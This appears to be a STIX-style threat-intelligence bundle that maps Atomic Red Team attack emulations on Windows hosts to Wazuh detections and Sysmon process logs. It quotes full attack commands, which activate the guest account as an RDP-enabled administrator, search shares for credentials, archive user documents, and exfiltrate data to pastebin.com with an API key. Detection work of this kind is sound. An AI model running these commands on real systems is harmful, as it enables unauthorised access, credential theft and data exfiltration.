objects.name: Valid Accounts:Default Accounts
objects.description: Attacker executes Atomic Red Team test T1078.001 #1 to activate the default guest account on Windows host. This requires administrative privileges and enables the built-in guest account for subsequent lateral movement activities.

objects.name: Wazuh Detection for Valid Accounts:Default Accounts

WinEventData.parentCommandLine: \"cmd.exe\" /c net user guest /active:yes & net user guest Password123! & net localgroup Administrators guest /add & net localgroup \"Remote Desktop Users\" guest /add & reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f

objects.name: Network Share Discovery
objects.description: Attacker performs network share enumeration using Atomic Red Team test T1135 #5, executing PowerShell Get-SMBShare commands to identify available network shares accessible from the compromised Windows host.

objects.name: Wazuh Detection for Network Share Discovery

objects.name: Unsecured Credentials: Credential in Files
objects.description: Attacker searches for credentials in files using Atomic Red Team test T1552.001 #4, employing PowerShell findstr commands to locate password information in 'notapasswordfile.txt' on the network share, ultimately obtaining another Windows host's credentials.

objects.name: Wazuh Detection for Unsecured Credentials: Credential in Files

WinEventData.commandLine: \"powershell.exe\" & {cd C:\\Users\\windows-3\\Documents\\SharedFolder findstr /si pass *.xml *.doc *.txt *.xls ls -R | select-string -ErrorAction SilentlyContinue -Pattern username}

objects.name: Local Accounts
objects.description: Attacker creates a local administrator account 'art-test' on new Windows host using Atomic Red Team test T1078.003 #1, leveraging previously obtained credentials to establish persistent access with elevated privileges.

objects.name: Data From Local System
objects.description: Attacker collects sensitive files from target host using Atomic Red Team test T1005 #1, creating a compressed archive of identified valuable content using PowerShell Compress-Archive commands for subsequent exfiltration.

objects.name: Wazuh Detection for Data From Local System

WinEventData.commandLine: \"powershell.exe\" & {$startingDirectory = \\\"\"C:\\Users\\\"\" $outputZip = \\\"\"C:\\Users\\windows-1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\T1005\\\"\" $fileExtensionsString = \\\"\".doc, .docx, .txt\\\"\"  $fileExtensions = $fileExtensionsString -split \\\"\", \\\"\"  New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null  Function Search-Files {   param (     [string]$directory   )   $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {     $fileExtensions -contains $_.Extension.ToLower()   }   return $files }  $foundFiles = Search-Files -directory $startingDirectory if ($foundFiles.Count -gt 0) {   $foundFilePaths = $foundFiles.FullName   Compress-Archive -Path $foundFilePaths -DestinationPath \\\"\"$outputZip\\data.zip\\\"\"    Write-Host \\\"\"Zip file created: $outputZip\\data.zip\\\"\"   } else {       Write-Host \\\"\"No files found with the specified extensions.\\\"\"   }}

WinSystemData.message:
"Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2025-07-16 11:25:21.244
ProcessGuid: {0d343e97-8c21-6877-7d01-000000001e00}
ProcessId: 5012
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft Windows Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: "powershell.exe" & {$startingDirectory = \""C:\Users\""
$outputZip = \""C:\Users\windows-1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\T1005\""
$fileExtensionsString = \"".doc, .docx, .txt\"" 
$fileExtensions = $fileExtensionsString -split \"", \""

New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null

Function Search-Files {
  param (
    [string]$directory
  )
  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
    $fileExtensions -contains $_.Extension.ToLower()
  }
  return $files
}

$foundFiles = Search-Files -directory $startingDirectory
if ($foundFiles.Count -gt 0) {
  $foundFilePaths = $foundFiles.FullName
  Compress-Archive -Path $foundFilePaths -DestinationPath \""$outputZip\data.zip\""

  Write-Host \""Zip file created: $outputZip\data.zip\""
  } else {
      Write-Host \""No files found with the specified extensions.\""
  }}
CurrentDirectory: C:\Users\windows-1\AppData\Local\Temp\
User: WIN-1\windows-1
LogonGuid: {0d343e97-89f3-6877-1981-230000000000}
LogonId: 0x238119
TerminalSessionId: 0
IntegrityLevel: High
Hashes: SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {0d343e97-89fa-6877-3901-000000001e00}
ParentProcessId: 5812
ParentImage: C:\PROGRA~1\PowerShell\7\pwsh.exe
ParentCommandLine: "C:\progra~1\powershell\7\pwsh.exe" -sshs
ParentUser: WIN-1\windows-1"

objects.name: Exfiltration Over Web Service: Exfiltration to Text Storage Sites
objects.description: Attacker exfiltrates collected data using Atomic Red Team test T1567.003 #1, leveraging PowerShell Invoke-RestMethod to POST compressed data to pastebin.com as a text storage exfiltration vector.

objects.name: Wazuh Detection for Exfiltration Over Web Service: Exfiltration to Text Storage Sites

WinEventData.commandLine: \"powershell.exe\" & {$apiKey = \\\"\"6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\\\"\" $content = \\\"\"secrets, api keys, passwords...\\\"\" $url = \\\"\"https://pastebin.com/api/api_post.php\\\"\" $postData = @{   api_dev_key   = $apiKey   api_option    = \\\"\"paste\\\"\"   api_paste_code = $content } $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData Write-Host \\\"\"Your paste URL: $response\\\"\"}

WinSystemData.message:
"Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2025-07-16 11:25:22.918
ProcessGuid: {0d343e97-8c22-6877-8301-000000001e00}
ProcessId: 4920
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft Windows Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: "powershell.exe" & {$apiKey = \""6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\""
$content = \""secrets, api keys, passwords...\""
$url = \""https://pastebin.com/api/api_post.php\""
$postData = @{
  api_dev_key   = $apiKey
  api_option    = \""paste\""
  api_paste_code = $content
}
$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
Write-Host \""Your paste URL: $response\""}

objects.name: x-oca-behavior Extension Definition
objects.description: This schema creates a new object type called x-oca-behavior. x-oca-behavior objects describe higher-level functionality than can be described using SCOs.

objects.name: x-oca-detection Extension Definition
objects.description: This schema creates a new object type called detection, which contain queries or other actionable information that can identify an event or behavior.

objects.name: x-oca-detector Extension Definition
objects.description: This schema creates a new object type called detector, which describes software that is capable of performing detections.

objects.name: x-oca-asset Extension Definition
objects.description: This schema creates a new object type called x-oca-asset.
